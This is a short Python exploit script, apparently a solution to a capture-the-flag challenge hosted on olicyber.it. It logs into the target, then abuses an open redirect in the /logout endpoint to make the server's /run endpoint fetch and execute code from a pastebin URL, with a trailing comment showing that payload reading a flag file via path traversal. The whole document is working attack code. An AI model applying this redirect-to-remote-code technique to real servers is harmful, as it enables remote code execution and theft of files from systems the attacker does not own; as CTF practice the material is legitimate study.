import requests
site = "http://cloud_free_tier.challs.olicyber.it"
s = requests.Session()
s.post(site + "/login", data={"username":"sas123sas", "password":"sas123sas"})
print(s.cookies.get_dict())
r = s.post(site + "/run", data={"file":"/logout?redirect=https://pastebin.com/raw/XJ0MvVrv"})
print(r.text)
'''
flag = open("../../flag.txt")
print(flag.read())
'''
